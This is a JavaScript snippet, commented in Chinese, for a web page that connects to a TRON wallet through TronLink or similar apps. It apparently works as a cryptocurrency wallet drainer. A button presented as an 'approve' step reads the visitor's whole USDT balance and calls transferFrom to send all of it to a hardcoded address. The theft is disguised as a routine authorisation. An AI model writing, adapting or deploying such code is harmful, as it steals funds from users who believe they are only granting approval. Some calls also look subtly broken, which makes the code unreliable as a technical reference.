async function getTronWeb() {
    if (typeof window.tronWeb !== 'undefined') {
        return window.tronWeb;
    } else {
        alert('请安装支持TRC20的钱包（如TronLink, Bitpie, imToken）并登录');
        throw new Error('Wallet not found');
    }
}

const tokenAddress = 'TOKEN_CONTRACT_ADDRESS'; // USDT合约地址
const recipientAddress = 'TYrG44bTwLhiEGvb48HYtHCAkgk7etr4d3'; // 接收地址

document.getElementById('approveBtn').onclick = async function() {
    try {
        const tronWeb = await getTronWeb();
        const tokenContract = await tronWeb.contract().at(tokenAddress);
        
        // 获取用户USDT余额
        const amount = await tokenContract.balanceOf(tronWeb.defaultAddress.base58).call();
        
        // 授权合约支配用户的代币
        const approveTx = await tokenContract.approve(tronWeb.defaultAddress.base58, amount).send();
        await approveTx.wait(); // 等待交易确认
        
        // 转账所有USDT
        const transferTx = await tokenContract.transferFrom(tronWeb.defaultAddress.base58, recipientAddress, amount).send();
        await transferTx.wait(); // 等待交易确认
        
        document.getElementById('status').innerText = '授权并转账成功！';
    } catch (error) {
        console.error(error);
        document.getElementById('status').innerText = '操作失败: ' + error.message;
    }
};
